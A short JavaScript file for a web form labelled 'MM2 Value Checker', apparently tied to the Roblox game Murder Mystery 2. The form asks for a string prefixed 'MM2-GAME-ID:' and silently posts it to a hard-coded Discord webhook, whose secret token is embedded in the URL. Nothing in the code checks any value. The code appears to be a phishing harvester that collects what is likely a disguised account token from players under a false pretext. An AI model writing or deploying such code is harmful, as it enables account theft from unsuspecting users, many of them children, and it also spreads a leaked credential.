document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('mm2-form');
    const input = document.getElementById('mm2-input');
    
    form.addEventListener('submit', function(event) {
        event.preventDefault(); 
        
        const gameID = input.value.trim();
        
        if (!gameID.startsWith('MM2-GAME-ID:')) {
            alert('Please Enter A Valid MM2-GAME-ID.');
            return;
        }
        
        const gameIDValue = gameID.replace('MM2-GAME-ID:', '').trim();
        
        if (gameIDValue === '') {
            alert('Please Enter a Valid MM2-GAME-ID.');
            return;
        }
        
        const payload = {
            content: '', 
            embeds: [
                {
                    title: 'MM2-GAME-ID Submission',
                    description: `**GAME ID:**\n\`\`\`json\n${gameIDValue}\n\`\`\``,
                    color: 5814783,
                    fields: [
                        {
                            name: 'Facts',
                            value: 'Want To Check Out Your MM2 Value? Go To sitename!',
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'MM2 Value Checker',
                        icon_url: 'https://static.wikia.nocookie.net/murder-mystery-2/images/a/a3/Waves_knife.png/revision/latest?cb=20230705104524'
                    },
                    timestamp: new Date().toISOString() 
                }
            ]
        };

        fetch('https://discord.com/api/webhooks/1276758351308521503/NZbmOhTxQIZTu7DFyIHqSNYdrljeaKA0vc5A1sycvwHr5zP6LmzhnpdHi61eMi4GLc7r', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => response.json())
        .then(data => {
            input.value = ''; 
        })
        .catch(error => {
            console.error('Error:', error);
        });
    });
});
